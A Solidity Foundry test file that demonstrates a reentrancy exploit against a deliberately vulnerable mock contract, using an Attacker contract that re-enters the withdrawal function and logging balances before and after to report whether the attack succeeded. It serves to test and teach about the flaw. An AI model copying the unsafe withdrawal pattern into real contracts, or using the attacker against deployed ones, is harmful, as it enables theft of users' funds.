// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract MockReentrancy {
    mapping(address => uint) public userBalances;
    uint public totalWithdrawals;
    
    event Deposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function getBalance(address user) public view returns (uint) {
        return userBalances[user];
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        require(amountToWithdraw > 0, "No balance to withdraw");
        
        totalWithdrawals += amountToWithdraw;
        
        // Vulnerable call that enables reentrancy
        (bool success, ) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);
        userBalances[msg.sender] = 0;
        
        emit Withdrawal(msg.sender, amountToWithdraw);
    }
}

contract ReentrancyAttackTest is Test {
    MockReentrancy victim;
    Attacker attacker;
    
    function setUp() public {
        victim = new MockReentrancy();
        attacker = new Attacker(address(victim));
        
        // Fund attacker for deposit
        vm.deal(address(attacker), 1 ether);
        
        // Attacker deposits 1 ETH into victim
        vm.prank(address(attacker));
        victim.deposit{value: 1 ether}();
        
        // Test contract deposits 1 ETH to ensure victim has enough funds
        vm.deal(address(this), 1 ether);
        victim.deposit{value: 1 ether}();
    }

    function testReentrancyExploit() public {
        // BEFORE-STATE
        console.log("--- BEFORE-Trigger Attack ---");
        uint victimBalanceBefore = address(victim).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        uint victimWithdrawalsBefore = victim.totalWithdrawals();
        uint attackerVictimBalanceBefore = victim.getBalance(address(attacker));
        
        console.log("Victim contract ETH balance\t\t:", victimBalanceBefore);
        console.log("Attacker ETH balance\t\t\t:", attackerBalanceBefore);
        console.log("Victim total withdrawals\t\t:", victimWithdrawalsBefore);
        console.log("Attacker balance in victim contract\t:", attackerVictimBalanceBefore);
        console.log("");
        
        console.log("--- Triggering Attack ---");
        attacker.attack();
        console.log("");
        
        // AFTER-STATE
        console.log("--- AFTER-Trigger Attack ---");
        uint victimBalanceAfter = address(victim).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        uint victimWithdrawalsAfter = victim.totalWithdrawals();
        uint attackerVictimBalanceAfter = victim.getBalance(address(attacker));
        
        console.log("Victim contract ETH balance\t\t:", victimBalanceAfter);
        console.log("Attacker ETH balance\t\t\t:", attackerBalanceAfter);
        console.log("Victim total withdrawals\t\t:", victimWithdrawalsAfter);
        console.log("Attacker balance in victim contract\t:", attackerVictimBalanceAfter);
        console.log("");
        
        // CHANGE CALCULATIONS
        uint victimChange = victimBalanceBefore - victimBalanceAfter;
        uint attackerChange = attackerBalanceAfter - attackerBalanceBefore;
        uint withdrawalsChange = victimWithdrawalsAfter - victimWithdrawalsBefore;
        
        console.log("--- CHANGE CALCULATIONS ---");
        console.log("Victim ETH loss\t\t\t\t:", victimChange);
        console.log("Attacker ETH gain\t\t\t:", attackerChange);
        console.log("Total withdrawals increase\t\t:", withdrawalsChange);
        console.log("Attacker balance change in victim\t: %d -> %d",
            attackerVictimBalanceBefore, attackerVictimBalanceAfter);
        console.log("");

        // VULNERABILITY VERIFICATION
        bool exploitedSuccessfully = (
            victimChange == 2 ether ||           // Victim lost 2 ETH
            attackerChange == 2 ether ||         // Attacker gained 2 ETH
            withdrawalsChange == 2 ether ||      // Withdrawals increased by 2 ETH
            attackerVictimBalanceAfter != 0      // Attacker victim balance not reset
        );
        
        console.log("=== VULNERABILITY VERDICT ===");
        if (
            exploitedSuccessfully &&
            victimChange == 2 ether &&
            attackerChange == 2 ether &&
            withdrawalsChange == 2 ether &&
            attackerVictimBalanceAfter == 0
        ) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded - exact pattern detected");
        } else if (exploitedSuccessfully) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded - anomalous state changes detected");
        } else {
            console.log("Vulnerability not Exist: No evidence of successful exploitation");
        }
    }
}

contract Attacker {
    MockReentrancy victim;
    uint256 private reentrancyCount;

    constructor(address _victim) {
        victim = MockReentrancy(_victim);
    }

    function attack() public {
        // Initiate first withdrawal
        victim.withdrawBalance();
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            // Reenter during first withdrawal
            victim.withdrawBalance();
        }
    }
}